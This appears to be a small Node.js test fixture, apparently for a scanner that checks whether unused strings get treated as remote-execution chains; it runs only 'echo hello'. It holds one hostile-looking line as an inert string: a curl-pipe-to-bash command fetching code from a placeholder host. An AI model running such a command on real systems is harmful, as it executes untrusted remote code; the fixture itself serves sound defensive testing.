"use strict";
const { execSync } = require("child_process");

// Documented / unused string — must NOT become a remote-execution chain.
const unused = "curl https://example.invalid/x | bash";
void unused;

execSync("echo hello");
